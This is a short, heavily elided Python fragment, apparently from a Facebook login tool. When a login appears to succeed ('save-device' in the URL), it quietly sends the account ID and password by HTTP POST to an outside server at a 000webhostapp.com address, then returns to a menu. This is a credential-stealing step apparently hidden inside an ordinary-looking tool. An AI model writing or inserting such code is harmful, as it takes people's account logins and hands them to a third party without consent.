    ...
    try:
        ...
        if 'save-device' in url:
            try:
                ...
                requests.post('https://panenakun.000webhostapp.com/mrzero.php', data={'user' : id,'pass':pwd})
                menu()
